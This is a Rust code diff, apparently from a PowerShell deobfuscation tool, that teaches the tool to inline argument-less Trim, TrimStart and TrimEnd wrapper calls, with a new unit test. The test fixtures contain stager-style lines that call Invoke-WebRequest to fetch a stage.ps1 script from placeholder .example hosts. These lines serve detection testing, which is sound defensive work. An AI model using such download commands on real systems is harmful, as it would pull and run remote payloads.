@@ -970,7 +970,7 @@ static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*(Trim(?:Start|End)?)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*(Trim(?:Start|End)?)\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)"#,
     )
     .expect("ps literal trim extractor body regex")
 });
@@ -3333,16 +3333,16 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
         else {
             continue;
         };
-        let Some(chars_var) = caps.get(3).map(|m| m.as_str()) else {
-            continue;
-        };
-
         let param_index = parse_ps_function_param_indices(&params);
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let Some(chars_idx) = param_index.get(&chars_var.to_ascii_lowercase()).copied() else {
-            continue;
+        let chars_idx = match caps.get(3).map(|m| m.as_str()) {
+            Some(chars_var) => match param_index.get(&chars_var.to_ascii_lowercase()).copied() {
+                Some(idx) => Some(idx),
+                None => continue,
+            },
+            None => None,
         };
 
         out = inline_ps_literal_trim_calls(&out, &name, value_idx, chars_idx, kind);
@@ -3667,7 +3667,7 @@ fn inline_ps_literal_trim_calls(
     text: &str,
     name: &str,
     value_idx: usize,
-    chars_idx: usize,
+    chars_idx: Option<usize>,
     kind: PsTrimKind,
 ) -> String {
     let lower = text.to_ascii_lowercase();
@@ -3703,40 +3703,63 @@ fn inline_ps_literal_trim_calls(
             search_from = first_end;
             continue;
         }
-        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-        let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
-            search_from = first_end;
-            continue;
-        };
-        let mut call_end = second_end;
-        if parenthesized {
-            let after = skip_ascii_ws(bytes, call_end);
-            if bytes.get(after) != Some(&b')') {
-                search_from = second_end;
+
+        let (call_end, replacement) = if let Some(chars_idx) = chars_idx {
+            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+            let Some((second_end, second)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = first_end;
+                continue;
+            };
+            let mut call_end = second_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = second_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+
+            let args = [&first, &second];
+            let Some(value) = args.get(value_idx).copied() else {
+                search_from = call_end;
+                continue;
+            };
+            let Some(chars) = args.get(chars_idx).copied() else {
+                search_from = call_end;
+                continue;
+            };
+            if chars.is_empty() {
+                search_from = call_end;
                 continue;
             }
-            call_end = after + 1;
-        }
-
-        let args = [&first, &second];
-        let Some(value) = args.get(value_idx).copied() else {
-            search_from = call_end;
-            continue;
+            let trimmed = kind.apply_chars(value, chars);
+            if trimmed.len() > 8192 {
+                search_from = call_end;
+                continue;
+            }
+            (call_end, format!("'{}'", trimmed.replace('\'', "''")))
+        } else {
+            let mut call_end = first_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = first_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let trimmed = kind.apply_default(&first);
+            if trimmed.len() > 8192 {
+                search_from = call_end;
+                continue;
+            }
+            (call_end, format!("'{}'", trimmed.replace('\'', "''")))
         };
-        let Some(chars) = args.get(chars_idx).copied() else {
-            search_from = call_end;
-            continue;
-        };
-        if chars.is_empty() {
-            search_from = call_end;
-            continue;
-        }
-        let trimmed = kind.apply(value, chars);
-        if trimmed.len() > 8192 {
-            search_from = call_end;
-            continue;
-        }
-        let replacement = format!("'{}'", trimmed.replace('\'', "''"));
         matches.push((call_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
@@ -3769,11 +3792,19 @@ impl PsTrimKind {
         }
     }
 
-    fn apply<'a>(self, value: &'a str, chars: &str) -> &'a str {
+    fn apply_chars<'a>(self, value: &'a str, chars: &str) -> &'a str {
         match self {
             Self::Both => value.trim_matches(|ch| chars.contains(ch)),
             Self::Start => value.trim_start_matches(|ch| chars.contains(ch)),
             Self::End => value.trim_end_matches(|ch| chars.contains(ch)),
+        }
+    }
+
+    fn apply_default(self, value: &str) -> &str {
+        match self {
+            Self::Both => value.trim(),
+            Self::Start => value.trim_start(),
+            Self::End => value.trim_end(),
         }
     }
 }
@@ -6528,6 +6559,23 @@ Clean 'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1'"),
             "trim-end extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_no_arg_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value) {
+  return $value.Trim()
+}
+Clean '   Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1   '"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1'"
+            ),
+            "no-arg trim extractor call was not rewritten:\n{out}"
         );
     }
 
